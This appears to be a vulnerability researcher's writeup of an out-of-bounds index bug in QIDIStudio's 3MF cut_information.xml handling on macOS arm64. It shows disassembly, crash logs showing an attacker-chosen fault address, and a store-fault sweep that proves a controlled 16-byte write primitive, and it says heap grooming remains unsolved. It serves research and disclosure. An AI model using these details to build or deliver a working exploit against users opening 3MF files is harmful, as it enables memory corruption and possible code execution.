# 3MF cut_information.xml OOB index → controlled write-what-where (QIDIStudio, macOS arm64)

Same bug as the Windows writeup (`bbs_3mf.cpp` / QIDI `qds_3mf.cpp` cut-connector apply
loop). Target: QIDIStudio clone (`/tmp/qidi_obs.app`, a signal-observer build of the
shipped app) driven with `runoff` (ASLR disabled → deterministic addresses).

## The vulnerable code (QIDI binary, arm64)

```
0x100302fb0  ldp  w10, w11, [x9]          ; w10 = volume_id, w11 = type   (from XML)
0x100302fb4  sxtw x10, w10                ; sign-extend volume_id
0x100302fb8  ldr  x12, [x22, #0x70]       ; x12 = volumes.data()   (x22 = model_object)
0x100302fbc  ldr  x10, [x12, x10, lsl #3] ; x10 = P = *(data()+vid*8)   ← OOB READ (fault site)
0x100302fc8  strh w12, [x10, #0x1d8]      ; CutInfo bools
0x100302fd0  str  w11, [x10, #0x1dc]      ; type          (controlled)
0x100302fd4  str  q0,  [x10, #0x1e0]      ; radius/height/tol = 16 controlled bytes
```

Controlled write = 16 bytes (`str q0`) at `P+0x1e0` + 4 bytes (`type`) at `P+0x1dc`,
with `P = *(data()+vid*8)`. Struct offset `0x1e0` (Windows uses `0x1e8`).

## Proof 1 — OOB read address fully attacker-controlled (LOAD fault)

3mf with `volume_id = 134217728 (0x8000000)`:

```
signal 10 (SIGBUS)  pc = 0x100302fbc   (the OOB load)
x12 = 0x8bf990110   = volumes.data()
x10 = 0x8000000     = volume_id
fault = 0x8ff990110 = x12 + x10*8   (EXACT)
```

`volumes.data() = 0x8bf990110`, **fixed** (ASLR off). Attacker picks the read address.

## Proof 2 — the write executes through P (STORE faults)

`sweep3mf.sh` sweep (store site `pc = 0x100302fc8`, `strh w12,[x10,#0x1d8]`):

```
vid=32768/16384/8192  fault=0x1d8              P=0x0            (NULL+0x1d8 write)
vid=-8192             fault=0x1d7              P=0xffff…ffff    (-1 slot)
vid=-32768            fault=0x…9310            P=0x…9138        (wild heap ptr, store @ P+0x1d8)
vid=65536            fault=P+0x1d8            P varies         (mapped, run-to-run variance)
```

`fault = P + 0x1d8` confirms the CutInfo store dispatches through the attacker-selected P.

## Remaining step (shared with Windows)

Precise control of the slot value P. The reachable window (`int vid*8` = ±16 GB) covers
the small-heap neighbourhood, whose slots hold allocator metadata / NULL / uninitialised
values that vary run-to-run; the 0x50 marker **mesh** buffer is a large `mmap` region
outside int reach. Landing a **chosen** P (heap grooming) is the one open step; the
attacker-chosen fault address, the 16-byte controlled payload, and write-through-P are
all proven live.

## Artifacts
`/tmp/qidiwork/{probe3mf.sh, sweep3mf.sh}`, `/tmp/win/spray_x/` (marker-mesh 3mf),
`runoff`, `/tmp/qidi_obs.app`, observer at `/private/tmp/observer.c`.
